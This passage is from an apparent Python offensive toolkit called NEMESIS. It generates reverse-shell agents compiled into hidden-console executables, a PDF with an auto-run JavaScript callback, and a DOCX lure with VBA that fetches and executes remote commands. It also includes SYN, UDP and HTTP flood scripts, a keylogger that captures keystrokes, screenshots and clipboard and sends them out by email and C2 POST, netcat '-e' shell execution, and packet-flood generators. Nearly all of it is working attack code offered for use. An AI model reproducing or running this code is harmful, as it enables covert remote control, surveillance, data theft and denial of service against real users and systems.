                with tarfile.open(file_path, 'r') as t:
                    t.extractall(extract_dir)
                    result += f"Extracted {len(t.getnames())} files from TAR archive\n"
                    result += "\n".join(t.getnames())
            elif file_path.endswith('.gz'):
                with gzip.open(file_path, 'rb') as f_in:
                    output_path = os.path.join(extract_dir, os.path.basename(file_path).replace('.gz', ''))
                    with open(output_path, 'wb') as f_out:
                        shutil.copyfileobj(f_in, f_out)
                    result += f"Decompressed to: {output_path}\n"
            else:
                result += "No supported archive format detected.\n"
            
            self.db.save_re_job(job_id, file_path, 'extract', result)
            
            return result
        except Exception as e:
            return f"Error: {e}"

# =====================
# PAYLOAD GENERATOR
# =====================
class PayloadGenerator:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.callback_host = config.get('payload.default_callback', 'localhost')
        self.callback_port = config.get('payload.default_port', 4444)
    
    def generate_exe(self, name: str, callback_host: str = None, callback_port: int = None) -> Payload:
        payload_id = str(uuid.uuid4())[:8]
        callback_host = callback_host or self.callback_host
        callback_port = callback_port or self.callback_port
        
        file_name = f"{name}_{payload_id}.exe"
        file_path = os.path.join(PAYLOADS_DIR, file_name)
        
        template = f'''#!/usr/bin/env python3
import socket, subprocess, sys, time, os, json, platform, uuid, requests

CALLBACK_HOST = "{callback_host}"
CALLBACK_PORT = {callback_port}
AGENT_ID = str(uuid.uuid4())[:8]

def get_system_info():
    return {{"agent_id": AGENT_ID, "hostname": socket.gethostname(),
             "os": platform.system() + " " + platform.release(),
             "ip": socket.gethostbyname(socket.gethostname()),
             "user": os.getlogin(), "pid": os.getpid()}}

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return {{"success": result.returncode == 0,
                 "output": result.stdout if result.stdout else result.stderr,
                 "exit_code": result.returncode}}
    except Exception as e:
        return {{"success": False, "output": str(e), "exit_code": -1}}

def main():
    print(f"NEMESIS Agent {{AGENT_ID}} connecting to {{CALLBACK_HOST}}:{{CALLBACK_PORT}}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((CALLBACK_HOST, CALLBACK_PORT))
        while True:
            data = sock.recv(4096).decode('utf-8')
            if not data: break
            command = json.loads(data)
            result = execute_command(command.get('cmd', ''))
            sock.send(json.dumps(result).encode('utf-8'))
    except Exception as e:
        print(f"Error: {{e}}")

if __name__ == "__main__":
    main()
'''
        
        with open(file_path, 'w') as f:
            f.write(template)
        
        if PYINSTALLER_AVAILABLE:
            try:
                subprocess.run([
                    'pyinstaller', '--onefile', '--noconsole', '--name', file_name.replace('.exe', ''),
                    '--distpath', PAYLOADS_DIR, '--workpath', TEMP_DIR, file_path
                ], capture_output=True, timeout=60)
            except:
                pass
        
        payload = Payload(
            id=payload_id,
            name=name,
            payload_type="exe",
            file_path=file_path,
            created_at=datetime.datetime.now().isoformat(),
            callback_host=callback_host,
            callback_port=callback_port
        )
        
        return payload
    
    def generate_pdf(self, name: str, callback_host: str = None, callback_port: int = None) -> Payload:
        payload_id = str(uuid.uuid4())[:8]
        callback_host = callback_host or self.callback_host
        callback_port = callback_port or self.callback_port
        
        file_name = f"{name}_{payload_id}.pdf"
        file_path = os.path.join(PAYLOADS_DIR, file_name)
        
        pdf_content = f'''%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [4 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Action /S /JavaScript /JS (
  var host = "{callback_host}";
  var port = {callback_port};
  var agent_id = app.calculateNow().toString();
  try {{
    var xmlhttp = new XMLHttpRequest();
    var url = "http://" + host + ":" + port + "/pdf/ping/" + agent_id;
    xmlhttp.open("GET", url, false);
    xmlhttp.send();
  }} catch(e) {{ }}
) >>
endobj
4 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R >>
endobj
5 0 obj
<< /Length 44 >>
stream
BT /F1 24 Tf 100 700 Td (NEMESIS Security) Tj ET
endstream
endobj
xref
0 6
trailer << /Root 1 0 R >>
%%EOF
'''
        
        with open(file_path, 'w') as f:
            f.write(pdf_content)
        
        payload = Payload(
            id=payload_id,
            name=name,
            payload_type="pdf",
            file_path=file_path,
            created_at=datetime.datetime.now().isoformat(),
            callback_host=callback_host,
            callback_port=callback_port
        )
        
        return payload
    
    def generate_docx(self, name: str, callback_host: str = None, callback_port: int = None) -> Payload:
        payload_id = str(uuid.uuid4())[:8]
        callback_host = callback_host or self.callback_host
        callback_port = callback_port or self.callback_port
        
        file_name = f"{name}_{payload_id}.docx"
        file_path = os.path.join(PAYLOADS_DIR, file_name)
        
        if DOCX_AVAILABLE:
            doc = Document()
            doc.add_heading('NEMESIS Security Report', 0)
            doc.add_paragraph('Please enable macros to view this document properly.')
            doc.add_paragraph('')
            doc.add_paragraph('Security vulnerabilities found:')
            
            vba_code = f'''
Private Sub Document_Open()
    Call RunPayload
End Sub

Sub RunPayload()
    On Error Resume Next
    Dim host As String
    Dim port As Integer
    Dim agent_id As String
    
    host = "{callback_host}"
    port = {callback_port}
    agent_id = CreateObject("Scripting.Dictionary").Count & "-" & Now
    
    On Error Resume Next
    Dim objXMLHTTP
    Dim objStream
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    objXMLHTTP.Open "GET", "http://" & host & ":" & port & "/docx/ping/" & agent_id, False
    objXMLHTTP.Send
    
    Dim cmd
    cmd = objXMLHTTP.responseText
    If cmd <> "" Then
        Dim wsh
        Set wsh = CreateObject("WScript.Shell")
        Dim result
        result = wsh.Exec(cmd).StdOut.ReadAll
        objXMLHTTP.Open "POST", "http://" & host & ":" & port & "/docx/result/" & agent_id, False
        objXMLHTTP.Send result
    End If
End Sub
'''
            doc.add_paragraph('')
            doc.add_paragraph('=' * 50)
            doc.add_paragraph('VBA Macro Code:')
            doc.add_paragraph('')
            doc.add_paragraph(vba_code)
            doc.save(file_path)
        else:
            with open(file_path, 'w') as f:
                f.write(f"NEMESIS DOCX Payload\nCallback: {callback_host}:{callback_port}\n")
        
        payload = Payload(
            id=payload_id,
            name=name,
            payload_type="docx",
            file_path=file_path,
            created_at=datetime.datetime.now().isoformat(),
            callback_host=callback_host,
            callback_port=callback_port
        )
        
        return payload
    
    def generate_link(self, name: str, url: str = None) -> Payload:
        payload_id = str(uuid.uuid4())[:8]
        file_name = f"{name}_{payload_id}.url"
        file_path = os.path.join(PAYLOADS_DIR, file_name)
        
        if not url:
            url = f"http://{self.callback_host}:{self.callback_port}/payload/{payload_id}"
        
        link_content = f"""[InternetShortcut]
URL={url}
IconFile=shell32.dll,1
IconIndex=1
HotKey=0
"""
        
        with open(file_path, 'w') as f:
            f.write(link_content)
        
        payload = Payload(
            id=payload_id,
            name=name,
            payload_type="link",
            file_path=file_path,
            created_at=datetime.datetime.now().isoformat(),
            callback_host=self.callback_host,
            callback_port=self.callback_port
        )
        
        return payload
    
    def generate_network_payload(self, name: str, target_ip: str, target_port: int = 80,
                                 attack_type: str = "syn") -> Payload:
        payload_id = str(uuid.uuid4())[:8]
        file_name = f"{name}_{payload_id}.py"
        file_path = os.path.join(PAYLOADS_DIR, file_name)
        
        template = f'''#!/usr/bin/env python3
import socket, time, sys, random, threading, requests, subprocess, os

TARGET_IP = "{target_ip}"
TARGET_PORT = {target_port}
ATTACK_TYPE = "{attack_type}"
CALLBACK_HOST = "{self.callback_host}"
CALLBACK_PORT = {self.callback_port}

def syn_flood(target, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((target, port))
            sock.close()
        except:
            pass

def udp_flood(target, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(os.urandom(1024), (target, port))
            sock.close()
        except:
            pass

def http_flood(target, port):
    while True:
        try:
            import http.client
            conn = http.client.HTTPConnection(target, port, timeout=1)
            conn.request("GET", "/", headers={{"User-Agent": "NEMESIS-CRAB-V2"}})
            conn.getresponse()
            conn.close()
        except:
            pass

def main():
    print(f"Starting {{ATTACK_TYPE}} attack on {{TARGET_IP}}:{{TARGET_PORT}}")
    if ATTACK_TYPE == "syn":
        syn_flood(TARGET_IP, TARGET_PORT)
    elif ATTACK_TYPE == "udp":
        udp_flood(TARGET_IP, TARGET_PORT)
    elif ATTACK_TYPE == "http":
        http_flood(TARGET_IP, TARGET_PORT)
    else:
        syn_flood(TARGET_IP, TARGET_PORT)

if __name__ == "__main__":
    main()
'''
        
        with open(file_path, 'w') as f:
            f.write(template)
        
        payload = Payload(
            id=payload_id,
            name=name,
            payload_type="network",
            file_path=file_path,
            created_at=datetime.datetime.now().isoformat(),
            callback_host=self.callback_host,
            callback_port=self.callback_port
        )
        
        return payload
    
    def list_payloads(self, payload_type: str = None) -> List[Dict]:
        return self.db.get_payloads(payload_type)
    
    def deploy_payload(self, payload_id: str, deployment_type: str, target: str = None) -> Dict:
        payloads = self.db.get_payloads()
        payload = next((p for p in payloads if p['id'] == payload_id), None)
        
        if not payload:
            return {'success': False, 'error': f'Payload {payload_id} not found'}
        
        file_path = payload['file_path']
        if not os.path.exists(file_path):
            return {'success': False, 'error': f'Payload file not found: {file_path}'}
        
        self.db.log_payload_deployment(payload_id, deployment_type, target or 'unknown', 'deployed')
        
        return {
            'success': True,
            'message': f'Payload {payload_id} deployed via {deployment_type}',
            'payload_id': payload_id,
            'deployment_type': deployment_type
        }

# =====================
# KEYLOGGER MODULE
# =====================
class KeyloggerModule:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.listener = None
        self.text = ""
        self.current_window = ""
        self.current_process = ""
        self.log_file = config.get('keylogger.log_file', KEYLOG_FILE)
        self.c2_server = config.get('keylogger.c2_server', "")
        self.upload_interval = config.get('keylogger.upload_interval', 30)
        self.screenshot_interval = config.get('keylogger.screenshot_interval', 60)
        self.capture_clipboard = config.get('keylogger.capture_clipboard', True)
        self.upload_timer = None
        self.screenshot_timer = None
        self.clipboard_timer = None
        self.last_clipboard = ""
        self.exfil_methods = config.get('keylogger.exfil_methods', ["file", "email", "c2"])
    
    def start(self):
        if not KEYLOGGER_AVAILABLE:
            print(f"{Colors.ERROR}❌ Keylogger not available (pynput required){Colors.RESET}")
            return False
        
        if self.running:
            return True
        
        try:
            self.running = True
            self.text = ""
            
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
            
            if self.screenshot_interval > 0:
                self.screenshot_timer = threading.Timer(self.screenshot_interval, self._take_screenshot)
                self.screenshot_timer.daemon = True
                self.screenshot_timer.start()
            
            if self.capture_clipboard:
                self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
                self.clipboard_timer.daemon = True
                self.clipboard_timer.start()
            
            print(f"{Colors.SUCCESS}✅ Keylogger started (F10 to stop){Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.ERROR}❌ Failed to start keylogger: {e}{Colors.RESET}")
            return False
    
    def stop(self):
        self.running = False
        
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        for timer in [self.upload_timer, self.screenshot_timer, self.clipboard_timer]:
            if timer:
                try:
                    timer.cancel()
                except:
                    pass
        
        self._save_keylog()
        print(f"{Colors.SUCCESS}✅ Keylogger stopped{Colors.RESET}")
    
    def on_press(self, key):
        try:
            if key == keyboard.Key.f10:
                self.stop()
                return False
            
            if key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace and len(self.text) > 0:
                self.text = self.text[:-1]
            elif hasattr(key, 'char') and key.char is not None:
                self.text += key.char
            
            if len(self.text) > 10000:
                self._save_keylog()
                self.text = ""
        except Exception as e:
            logger.error(f"Keylogger error: {e}")
    
    def _save_keylog(self):
        if self.text:
            timestamp = datetime.datetime.now().isoformat()
            screenshot_path = ""
            
            if self.screenshot_interval > 0:
                screenshot_path = self._take_screenshot()
            
            self.db.save_keylog(self.text, self.current_window, self.current_process, screenshot_path)
            
            with open(self.log_file, 'a') as f:
                f.write(f"\n[{timestamp}] [{self.current_window}]\n{self.text}\n")
            
            self._exfiltrate_data(self.text, screenshot_path)
            logger.info(f"Saved {len(self.text)} keylog characters")
    
    def _take_screenshot(self) -> str:
        try:
            import pyautogui
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = os.path.join(KEYLOG_SCREENSHOTS_DIR, f"screenshot_{timestamp}.png")
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            logger.info(f"Screenshot saved: {screenshot_path}")
            return screenshot_path
        except:
            return ""
    
    def _monitor_clipboard(self):
        if not self.running:
            return
        
        try:
            import pyperclip
            current = pyperclip.paste()
            if current and current != self.last_clipboard:
                self.last_clipboard = current
                self.db.save_clipboard(current, "keylogger")
                logger.info(f"Clipboard captured: {current[:100]}...")
                self._exfiltrate_clipboard(current)
        except:
            pass
        
        if self.running:
            self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
            self.clipboard_timer.daemon = True
            self.clipboard_timer.start()
    
    def _exfiltrate_data(self, text: str, screenshot_path: str = ""):
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(text, screenshot_path)
                elif method == "email":
                    self._exfil_email(text, screenshot_path)
                elif method == "c2":
                    self._exfil_c2(text, screenshot_path)
            except Exception as e:
                logger.error(f"Exfil via {method} failed: {e}")
    
    def _exfil_file(self, text: str, screenshot_path: str):
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(KEYLOG_EXFIL_DIR, f"exfil_{timestamp}.txt")
            with open(filename, 'w') as f:
                f.write(f"[{timestamp}]\n{text}\n")
                if screenshot_path:
                    f.write(f"\nScreenshot: {screenshot_path}\n")
            logger.info(f"Exfil saved to file: {filename}")
        except:
            pass
    
    def _exfil_email(self, text: str, screenshot_path: str):
        try:
            smtp_server = self.config.get('spear_phishing.smtp_server', '')
            smtp_port = self.config.get('spear_phishing.smtp_port', 587)
            smtp_username = self.config.get('spear_phishing.smtp_username', '')
            smtp_password = self.config.get('spear_phishing.smtp_password', '')
            to_email = self.config.get('keylogger.email_recipient', '')
            
            if not all([smtp_server, smtp_username, smtp_password, to_email]):
                return
            
            msg = email.message.EmailMessage()
            msg['Subject'] = f"Keylog Data - {datetime.datetime.now().isoformat()}"
            msg['From'] = smtp_username
            msg['To'] = to_email
            msg.set_content(f"Keylog Data:\n\n{text}")
            
            if screenshot_path and os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    msg.add_attachment(f.read(), maintype='image', subtype='png', filename=os.path.basename(screenshot_path))
            
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(smtp_username, smtp_password)
                server.send_message(msg)
            
            logger.info("Keylog exfiltrated via email")
        except:
            pass
    
    def _exfil_c2(self, text: str, screenshot_path: str):
        if not self.c2_server:
            return
        try:
            data = {
                'timestamp': datetime.datetime.now().isoformat(),
                'text': text,
                'hostname': socket.gethostname(),
                'window': self.current_window
            }
            if screenshot_path:
                data['screenshot'] = base64.b64encode(open(screenshot_path, 'rb').read()).decode()
            
            requests.post(self.c2_server, json=data, timeout=10)
            logger.info("Keylog exfiltrated via C2")
        except:
            pass
    
    def _exfiltrate_clipboard(self, text: str):
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(f"CLIPBOARD: {text}", "")
                elif method == "email":
                    self._exfil_email(f"CLIPBOARD: {text}", "")
                elif method == "c2":
                    self._exfil_c2(f"CLIPBOARD: {text}", "")
            except:
                pass
    
    def _upload_keylog(self):
        if self.text:
            self._save_keylog()
            self.text = ""
        
        if self.running:
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
    
    def get_keylogs(self, limit: int = 100):
        return self.db.get_keylogs(limit)
    
    def get_screenshots(self) -> List[str]:
        try:
            return [f for f in os.listdir(KEYLOG_SCREENSHOTS_DIR) if f.startswith('screenshot_')]
        except:
            return []

# =====================
# DOMAIN HOSTING ENGINE
# =====================
class DomainHostingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.hosted_domains = {}
    
    def translate_ip_to_domain(self, ip: str) -> Optional[str]:
        try:
            domain = self.db.resolve_ip(ip)
            if domain:
                return domain
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            return None
        except Exception as e:
            logger.error(f"IP to domain translation error: {e}")
            return None
    
    def translate_domain_to_ip(self, domain: str) -> Optional[str]:
        try:
            ip = self.db.resolve_domain(domain)
            if ip:
                return ip
            try:
                ip = socket.gethostbyname(domain)
                if ip:
                    return ip
            except:
                pass
            return None
        except Exception as e:
            logger.error(f"Domain to IP translation error: {e}")
            return None
    
    def host_domain(self, ip: str, domain: str, port: int = 8080) -> DomainHost:
        try:
            ipaddress.ip_address(ip)
            host_id = str(uuid.uuid4())[:8]
            hosting_path = os.path.join(DOMAIN_HOSTING_DIR, host_id)
            os.makedirs(hosting_path, exist_ok=True)
            
            domain_host = DomainHost(
                id=host_id,
                ip=ip,
                domain=domain,
                hosting_path=hosting_path,
                created_at=datetime.datetime.now().isoformat(),
                active=True
            )
            
            self.db.add_domain_host(domain_host)
            self.hosted_domains[domain] = {'ip': ip, 'port': port, 'path': hosting_path, 'id': host_id}
            
            logger.info(f"Domain {domain} hosted on IP {ip}:{port}")
            return domain_host
        except Exception as e:
            logger.error(f"Domain hosting error: {e}")
            return None
    
    def host_website(self, domain: str, html_content: str) -> bool:
        try:
            if domain not in self.hosted_domains:
                return False
            
            domain_info = self.hosted_domains[domain]
            index_path = os.path.join(domain_info['path'], 'index.html')
            
            with open(index_path, 'w') as f:
                f.write(html_content)
            
            port = domain_info['port']
            threading.Thread(target=self._start_http_server, args=(domain_info['path'], port), daemon=True).start()
            
            logger.info(f"Website hosted on http://{domain}:{port}")
            return True
        except Exception as e:
            logger.error(f"Website hosting error: {e}")
            return False
    
    def _start_http_server(self, path: str, port: int):
        try:
            os.chdir(path)
            handler = http.server.SimpleHTTPRequestHandler
            with socketserver.TCPServer(("0.0.0.0", port), handler) as httpd:
                logger.info(f"Serving domain on port {port}")
                httpd.serve_forever()
        except Exception as e:
            logger.error(f"HTTP server error: {e}")
    
    def list_hosted_domains(self) -> List[Dict]:
        return self.db.get_domain_hosts()
    
    def get_domain_ips(self) -> Dict[str, str]:
        rows = self.db.get_domain_hosts()
        return {row['domain']: row['ip'] for row in rows if row['active']}

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    @staticmethod
    def ping(target: str, count: int = 4) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def nmap(target: str, scan_type: str = "quick") -> CommandResult:
        start_time = time.time()
        try:
            scan_map = {
                "quick": ['nmap', '-T4', '-F', target],
                "full": ['nmap', '-p-', target],
                "service": ['nmap', '-sV', target],
                "os": ['nmap', '-O', target],
                "udp": ['nmap', '-sU', target],
                "vuln": ['nmap', '--script', 'vuln', target],
                "stealth": ['nmap', '-sS', '-T2', target],
                "snmp": ['nmap', '-sU', '-p', '161', '--script', 'snmp-*', target],
                "smb": ['nmap', '-p', '445', '--script', 'smb-*', target],
                "ssh": ['nmap', '-p', '22', '--script', 'ssh-*', target],
                "comprehensive": ['nmap', '-sS', '-sV', '-O', '-p-', target],
                "ping": ['nmap', '-sn', target]
            }
            cmd = scan_map.get(scan_type, ['nmap', target])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def curl(url: str, method: str = "GET", data: str = None, headers: Dict = None) -> CommandResult:
        start_time = time.time()
        try:
            cmd = ['curl', '-s']
            
            if headers:
                for key, value in headers.items():
                    cmd.extend(['-H', f'{key}: {value}'])
            
            if method.upper() != "GET":
                cmd.extend(['-X', method.upper()])
            
            if data and method.upper() in ["POST", "PUT", "PATCH"]:
                cmd.extend(['-d', data])
            
            cmd.append(url)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def netcat(host: str, port: int, command: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('nc'):
                if command:
                    cmd = ['nc', host, str(port), '-e', command]
                else:
                    cmd = ['nc', '-zv', host, str(port)]
            elif shutil.which('ncat'):
                if command:
                    cmd = ['ncat', host, str(port), '-e', command]
                else:
                    cmd = ['ncat', '-zv', host, str(port)]
            else:
                return CommandResult(False, "Netcat not found", 0, "nc/ncat not installed")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def traceroute(target: str) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-d', target]
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1', target]
                else:
                    cmd = ['traceroute', '-n', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def whois(domain: str) -> CommandResult:
        start_time = time.time()
        try:
            if WHOIS_AVAILABLE:
                result = whois.whois(domain)
                execution_time = time.time() - start_time
                return CommandResult(True, str(result), execution_time)
            else:
                cmd = ['whois', domain]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                execution_time = time.time() - start_time
                return CommandResult(result.returncode == 0, result.stdout + result.stderr, execution_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def dns(domain: str, record_type: str = "A") -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('dig'):
                cmd = ['dig', domain, record_type, '+short']
            else:
                cmd = ['nslookup', domain]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def location(ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'isp': data.get('isp'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon')
                    }
            return {'success': False}
        except:
            return {'success': False}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def block_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=NEMESIS_Block_{ip}', 'dir=in', 'action=block',
                               f'remoteip={ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                               f'name=NEMESIS_Block_{ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def ip_to_domain(ip: str) -> Optional[str]:
        try:
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            return None
        except Exception as e:
            logger.error(f"IP to domain error: {e}")
            return None
    
    @staticmethod
    def domain_to_ip(domain: str) -> Optional[str]:
        try:
            try:
                ip = socket.gethostbyname(domain)
                if ip:
                    return ip
            except:
                pass
            return None
        except Exception as e:
            logger.error(f"Domain to IP error: {e}")
            return None

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGeneratorEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.active_generators: Dict[str, TrafficGenerator] = {}
        self.stop_events: Dict[str, threading.Event] = {}
    
    def get_available_types(self) -> List[str]:
        return [t.value for t in TrafficType]
    
    def generate(self, traffic_type: str, target_ip: str, duration: int,
                port: int = None, packet_rate: int = 100) -> TrafficGenerator:
        try:
            ipaddress.ip_address(target_ip)
        except:
            raise ValueError(f"Invalid IP: {target_ip}")
        
        if port is None:
            port_map = {
                'http_get': 80, 'http_post': 80, 'https': 443,
                'dns': 53, 'tcp_syn': 80, 'tcp_connect': 80, 'udp': 53
            }
            port = port_map.get(traffic_type, 0)
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        
        generator = TrafficGenerator(
            id=generator_id,
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.datetime.now().isoformat(),
            status="running"
        )
        
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_generator,
            args=(generator, packet_rate, stop_event),
            daemon=True
        )
        thread.start()
        
        self.active_generators[generator_id] = generator
        return generator
    
    def _run_generator(self, generator: TrafficGenerator, packet_rate: int,
                      stop_event: threading.Event):
        start_time = time.time()
        end_time = start_time + generator.duration
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / max(1, packet_rate)
        
        func = self._get_generator_func(generator.traffic_type)
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                size = func(generator.target_ip, generator.target_port)
                if size > 0:
                    packets_sent += 1
                    bytes_sent += size
                time.sleep(interval)
            except Exception as e:
                time.sleep(0.1)
        
        generator.packets_sent = packets_sent
        generator.bytes_sent = bytes_sent
        generator.end_time = datetime.datetime.now().isoformat()
        generator.status = "completed" if not stop_event.is_set() else "stopped"
        
        self.db.log_traffic(generator)
    
    def _get_generator_func(self, traffic_type: str):
        funcs = {
            'icmp': self._icmp,
            'tcp_syn': self._tcp_syn,
            'tcp_ack': self._tcp_ack,
            'tcp_connect': self._tcp_connect,
            'udp': self._udp,
            'http_get': self._http_get,
            'http_post': self._http_post,
            'https': self._https,
            'dns': self._dns,
            'arp': self._arp,
            'mixed': self._mixed,
            'random': self._random
        }
        return funcs.get(traffic_type, self._icmp)
    
    def _icmp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                subprocess.run(['ping', '-c', '1', '-W', '1', target],
                              capture_output=True, timeout=2)
                return 64
        except:
            return 0
    
    def _tcp_syn(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_ack(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="A")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_connect(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            return 40 if result == 0 else 0
        except:
            return 0
    
    def _udp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/UDP(dport=port)/b"NEMESIS"
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"NEMESIS", (target, port))
                sock.close()
                return 64
        except:
            return 0
    
    def _http_get(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "NEMESIS-CRAB-V2"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _http_post(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("POST", "/", body="test=data",
